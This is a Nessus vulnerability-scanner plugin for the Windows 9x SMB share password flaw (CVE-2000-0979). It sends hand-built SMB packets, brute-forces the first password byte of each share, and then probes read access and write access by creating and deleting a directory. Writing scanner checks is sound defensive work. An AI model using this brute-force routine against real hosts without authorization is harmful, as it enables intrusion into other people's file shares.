#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# Some fun functions
#

if(description)
{
 script_id(10524);
 script_bugtraq_id(1780);
 script_cve_id("CVE-2000-0979");
 script_version ("$Revision: 1.34 $");
 
 name["english"] = "SMB Windows9x password verification vulnerability";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
A vulnerability exists in the password verification scheme utilized by Microsoft
Windows 9x SMB protocol implementation. This vulnerability will allow any
user to access the Windows 9x file shared service with password protection.
Potential attackers don't have to know the share password.

Solution : See http://www.microsoft.com/technet/security/bulletin/ms00-072.mspx
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Access a remote share by brute forcing its password";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Windows";
 script_family(english:family["english"]);
 
 script_dependencies("netbios_name_get.nasl",
 		     "smb_login.nasl", "smb_enum_shares.nasl",
		     "smb_login_as_users.nasl");
 script_require_keys("SMB/name", "SMB/login", "SMB/password");
 script_exclude_keys("SMB/WindowsVersion","SMB/samba"); # only for Win9x
 script_require_ports(139, 445);
 script_timeout(0);
 exit(0);
}

include("smb_nt.inc");
include("global_settings.inc");

samba = get_kb_item("SMB/samba");
if(samba)exit(0);

if ( report_paranoia < 2 || ! thorough_tests ) exit(0);



port = kb_smb_transport();
if(!port)port = 139;

#
# connection to the remote IPC share
#		
function smb_tconx1(soc,name,uid, share, pass)
{
 high = uid / 256;
 low = uid % 256;
 len = 48 + strlen(name) + strlen(share) + 3;
 ulen = 5 + strlen(name) + strlen(share) + 3;
 
 
 
 req = raw_string(0x00, 0x00,
 		  0x00, len, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x28, low, high,
		  g_mlo, g_mhi, 0x04, 0xFF, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, ulen, 0x00, pass, 0x5C, 0x5C) +
	name + 
	raw_string(0x5C) + share +raw_string(0x00) +
	"A:"  + raw_string(0x00);
 send(socket:soc, data:req);
 r = smb_recv(socket:soc, length:1024);
 if(!r)return(FALSE);
 if(ord(r[9])==0)return(r);
 else return(FALSE);		   	 

}


#
# Get the listing for \* using a TRANS2_FIND2_FIRST function
#
function readable_share(soc, uid, tid)
{
 tid_lo = tid % 256;
 tid_hi = tid / 256;
 
 uid_lo = uid % 256;
 uid_hi = uid / 256;
 
 req = raw_string(0x00, 0x00,
 		  0x00, 0x53, 0xFF, 0x53, 0x4D, 0x42, 0x32, 0x00,
		  0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, tid_lo, tid_hi, 0x00, 0x28, uid_lo, uid_hi,
		  g_mlo, g_mhi, 0x0F, 0x0F, 0x00, 0x00, 0x00, 0x0A,
		  0x00, 0x04, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x44,
		  0x00, 0x00, 0x00, 0x53, 0x00, 0x01, 0x00, 0x01,
		  0x00, 0x12, 0x00, 0x00, 0x44, 0x20, 0x16, 0x00,
		  0x00, 0x02, 0x0E, 0x00, 0x04, 0x01, 0x00, 0x00,
		  0x00, 0x00, 0x5C, 0x2A, 0x00);
		  
 send(socket:soc, data:req);
 r = smb_recv(socket:soc, length:4096);
 if(ord(r[9]))
 {
  if((ord(r[11]) == 5) && (ord(r[12])==0))
   { 
    return(FALSE);
   }
  else return("unknown error");
 }
 else return("OK");
}
	
#
# Create a directory on the remote host to determine if the
# share is writeable or not
#

function writeable_share(soc, tid, uid)
{
 tid_lo = tid % 256;
 tid_hi = tid / 256;
 
 uid_lo = uid % 256;
 uid_hi = uid / 256;
 

 randstr = string(rand()%10, rand()%10, rand()%10, rand()%10);
 req = raw_string(0x00, 0x00,
 		  0x00, 0x30, 0xFF, 0x53, 0x4D, 0x42, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x03, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, tid_lo, tid_hi, 0x00, 0x28, uid_lo, uid_hi,
		  g_mlo, g_mhi, 0x00, 0x0D, 0x00, 0x04, 0x5C) +
		 "Nessus" + randstr + raw_string(0x00);

 send(socket:soc, data:req);
 r = smb_recv(socket:soc, length:1024);
 
 if(ord(r[9]))
 {
  if((ord(r[11]) == 5) && (ord(r[12])==0))
   { 
    return(FALSE);
   }
  else return("unknown error");
 }
 else 
 {
 # The dir was created. We delete it before we return
 req = raw_string(0x00, 0x00,
 		  0x00, 0x30, 0xFF, 0x53, 0x4D, 0x42, 0x01, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x03, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, tid_lo, tid_hi, 0x00, 0x28, uid_lo, uid_hi,
		  g_mlo, g_mhi, 0x00, 0x0D, 0x00, 0x04, 0x5C) +
		 "Nessus" + randstr + raw_string(0x00);

 send(socket:soc, data:req);
 r = smb_recv(socket:soc, length:8192);
 return("OK");
 }
}
		

function accessible_share(share)
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 r = smb_session_request(soc:soc,  remote:name);
 if(!r)return(FALSE);

  #
  # Negociate the protocol
  #
  prot = smb_neg_prot(soc:soc);
  if(!prot)exit(0);

  #
  # Set up our session 
  #
  r = smb_session_setup(soc:soc, login:login, password:pass, prot:prot);
  if(!r)return(FALSE);
  # and extract our uid
  uid = session_extract_uid(reply:r);
  access = " - (";
  c = 0;
  
  #
  # Brute force the password
  #
  for(i=0;i<256;i=i+1)
  {
   r = smb_tconx1(soc:soc, name:name, uid:uid, share:share, pass:i);
   if(r){
   	pass = i;
	if(i == 0)exit(0); # No password
   	i = 2000;
	}
  }
  if(r)
  { 
   tid = tconx_extract_tid(reply:r);
   readable = readable_share(soc:soc, uid:uid, tid:tid);
   if(readable){
   	if(readable == "unknown error")access = access + "readable?";
	else access = access + "readable";
	c = c + 1;
	}
    
    
   writeable = writeable_share(soc:soc, uid:uid, tid:tid);
   if(writeable){
   	if(access)access = access + ", ";
	c = c + 1;
	if(writeable == "unknown error")access = access + "writeable?";
	else access = access + "writeable";
	}
   close(soc);
   access = access + ")";
   access = access + " using the first letter of the password - " + hex(pass);
   if(c)return(access);
   else return(FALSE);
  }
  else close(soc);
  }
  return(FALSE);
 }		


#
# Here we go
#		


name = kb_smb_name();
if(!name)exit(0);




login = "*";
pass ="";
domain = "";

if(!get_port_state(port))exit(0);

count = 1;
shares = get_kb_list("SMB/shares");
if(isnull(shares))exit(0);
shares = make_list(shares);
run = 1;
vuln = "";


foreach share (shares)
{
 if(share != "IPC$")
 {
  accs = accessible_share(share:share);
  if(accs)
  {
   security_hole(port);
   exit(0);
  }
 }
}


